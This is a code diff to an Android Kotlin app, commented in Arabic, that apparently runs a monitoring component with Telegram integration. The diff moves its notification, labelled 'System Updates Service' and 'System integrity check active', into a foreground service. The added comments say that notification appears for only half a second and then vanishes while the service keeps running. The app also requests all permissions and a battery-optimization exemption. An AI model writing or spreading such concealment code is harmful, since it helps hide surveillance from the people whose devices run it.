@@ -47,14 +47,16 @@ import java.util.*
  * 6. تحميل الإعدادات من ConfigLoader.
  * 7. تشغيل Monitor و TelegramUi.
  * 8. عرض تقرير حالة التطبيق بشكل منظم على الشاشة.
+ * 
+ * ✅ تم استبدال الإشعار العادي بخدمة أمامية حقيقية (ForegroundService).
+ * ✅ الإشعار يظهر لمدة 0.5 ثانية فقط ثم يختفي نهائياً، مع بقاء الخدمة تعمل في الخلفية.
  */
 class MainActivity : AppCompatActivity() {
 
     companion object {
         private const val TAG = "MainActivity"
         const val APP_VERSION = "4.2.1"
-        const val NOTIFICATION_CHANNEL_ID = "system_service_channel"
-        const val NOTIFICATION_ID = 9921
+        // تم إزالة NOTIFICATION_CHANNEL_ID و NOTIFICATION_ID لأن الخدمة تدير الإشعار بنفسها
     }
 
     private lateinit var logEditText: EditText
@@ -201,6 +203,7 @@ class MainActivity : AppCompatActivity() {
         withContext(Dispatchers.Main) {
             requestAllPermissions()
         }
+        // ✅ استدعاء الخدمة الجديدة (الإشعار سيختفي بعد 0.5 ثانية)
         startSilentForegroundService()
         requestBatteryOptimizationExemption()
 
@@ -336,50 +339,27 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ==================== الخدمة الخلفية والإشعارات ====================
+    // ============================================================
+    //  ✅ الخدمة الخلفية الصامتة (Foreground Service)
+    //  تم استبدال الإشعار العادي بخدمة أمامية حقيقية
+    //  الإشعار يظهر لمدة 0.5 ثانية ثم يختفي نهائياً
+    // ============================================================
 
+    /**
+     * تشغيل الخدمة الخلفية الصامتة (يظهر الإشعار 0.5 ثانية فقط)
+     * يتم استدعاء ForegroundService الذي يدير الإشعار بنفسه.
+     */
     private fun startSilentForegroundService() {
         try {
-            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-
+            val serviceIntent = Intent(this, ForegroundService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                val channel = NotificationChannel(
-                    NOTIFICATION_CHANNEL_ID,
-                    "System Updates Service",
-                    NotificationManager.IMPORTANCE_LOW
-                ).apply {
-                    description = "Channel for background system services"
-                    setSound(null, null)
-                    enableVibration(false)
-                }
-                notificationManager.createNotificationChannel(channel)
-            }
-
-            val intent = Intent(this, MainActivity::class.java)
-            val pendingIntent = PendingIntent.getActivity(
-                this, 0, intent,
-                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
-            )
-
-            val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                Notification.Builder(this, NOTIFICATION_CHANNEL_ID)
+                startForegroundService(serviceIntent)
             } else {
-                @Suppress("DEPRECATION")
-                Notification.Builder(this)
+                startService(serviceIntent)
             }
-
-            val notification = builder
-                .setSmallIcon(applicationInfo.icon)
-                .setContentTitle("System Services")
-                .setContentText("System integrity check active")
-                .setOngoing(true)
-                .setContentIntent(pendingIntent)
-                .build()
-
-            notificationManager.notify(NOTIFICATION_ID, notification)
-            appendLog("✅ تم إطلاق إشعار الخدمة الخلفية.")
+            appendLog("✅ تم تشغيل الخدمة الخلفية (سيختفي الإشعار بعد 0.5 ثانية).")
         } catch (e: Exception) {
-            appendLog("⚠️ خطأ في إنشاء إشعار الخدمة: ${e.localizedMessage}")
+            appendLog("⚠️ فشل تشغيل الخدمة الخلفية: ${e.localizedMessage}")
         }
     }
 
